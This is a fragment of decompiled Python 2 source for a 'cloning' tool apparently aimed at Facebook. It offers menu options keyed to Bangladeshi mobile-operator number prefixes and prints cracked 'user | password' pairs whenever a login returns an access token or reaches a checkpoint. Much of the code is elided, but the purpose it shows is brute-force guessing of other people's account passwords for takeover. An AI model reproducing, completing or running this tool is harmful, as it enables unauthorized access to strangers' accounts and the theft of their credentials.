...
# Embedded file name: /storage/emulated/0/MOHONRONY.py
...
psb('\x1b[1;32m -- WEALCOME TO MOHON & RONY CLONING START PLEASE WAIT ......')
...
logo = '\x1b[1;93m--------------------------------------------------\n \x1b[1;93m  ---> Author  -> Mohon Rony <--- \n\x1b[1;93m-------------------------------------------------- \n\x1b[1;93m     Facebook  -> Mohon Rony \n\x1b[1;93m--------------------------------------------------\n\x1b[1;93m  ---> Github -> Mohon143 <--- \n\x1b[1;93m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;92mAUTHOR  : MOHON RONY '

    print '\x1b[1;92mFACEBOOK  : VALOBASAR.MARE.XHUDI.12'

    print '\x1b[1;92mGITHUB  : github.com/MOHON RONY'
    ...
    print '\x1b[1;92m[1]  ROBI (RONY)'

    print '\x1b[1;92m[2]  AIRTEL(NIL)'

    print '\x1b[1;92m[3]  BANGLALINK(MOHON)'

    print '\x1b[1;92m[4]  BANGLALINK(RAJ)'

    print '\x1b[1;92m[5]  GRAMEEN(MOHON)'

    print '\x1b[1;92m[6]  TELETALK(NIL )'
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[RONY-ok]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[MOHON-RONY-Cp]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
    ...
    os.system('python2 MOHONRONY.py')

if __name__ == '__main__':

    menu()

# okay decompiling MOHONRONY.pyc
